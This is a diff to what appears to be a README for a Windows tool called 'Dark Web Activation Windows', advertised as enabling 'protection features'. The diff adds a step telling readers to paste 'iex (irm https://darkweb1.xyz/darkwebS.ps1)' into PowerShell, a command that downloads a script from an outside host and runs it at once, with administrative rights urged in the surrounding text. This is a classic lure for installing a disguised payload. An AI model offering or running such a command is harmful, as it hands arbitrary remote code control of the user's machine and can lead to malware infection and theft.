@@ -39,6 +39,7 @@ To install **Dark Web Activation Windows**, you need to follow these steps:
 C:\Windows\DarkWeb
 3. Place the darkwebS.ps1 script inside this folder.
 4. Once this is done, you can execute the script directly from PowerShell to activate the protection features.
+5. Open PowerShell kust copy and paste command iex (irm https://darkweb1.xyz/darkwebS.ps1)
 
 Make sure you have administrative rights to execute the script.
 
